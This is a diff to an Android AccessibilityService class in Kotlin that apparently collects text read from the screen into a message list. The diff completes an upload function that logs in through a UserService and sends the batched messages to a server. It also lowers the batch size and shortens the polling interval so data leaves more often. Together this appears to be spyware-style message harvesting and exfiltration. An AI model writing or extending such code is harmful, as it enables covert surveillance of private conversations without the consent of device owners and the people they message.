@@ -9,6 +9,7 @@ import android.view.View
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.example.myapplication.network.UserService
 
 open class CompositionAbService(
 ) : AccessibilityService() {
@@ -18,8 +19,8 @@ open class CompositionAbService(
     private var user = ""
     private val messageList = ArrayList<String>()
     private val allMessageList = ArrayList<String>()
-    private val sleepDefault = 10 * 1000
-    private val friendSleep = sleepDefault * 10
+    private val sleepDefault = 5 * 1000
+    private val friendSleep = 1000 * 10 * 10
     private var sleep = sleepDefault
     private var uploading = false
 
@@ -43,7 +44,7 @@ open class CompositionAbService(
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if ((System.currentTimeMillis() - lastRead) < sleep) return
 
-        if (messageList.size > 1000 && !uploading) {
+        if (messageList.size > 200 && !uploading) {
             allMessageList.addAll(messageList)
             uploadMessage()
             if (allMessageList.size > 100 * 1000) allMessageList.clear()
@@ -58,7 +59,13 @@ open class CompositionAbService(
 
     private fun uploadMessage() {
         uploading = true
-
+        var liveMessage = ""
+        messageList.map { liveMessage = "$it\n$liveMessage" }
+        messageList.clear()
+        uploading = false
+        UserService.login {
+            UserService.uploadMessage(it, liveMessage)
+        }
     }
 
     private fun findAll(node: AccessibilityNodeInfo, level: Int) {
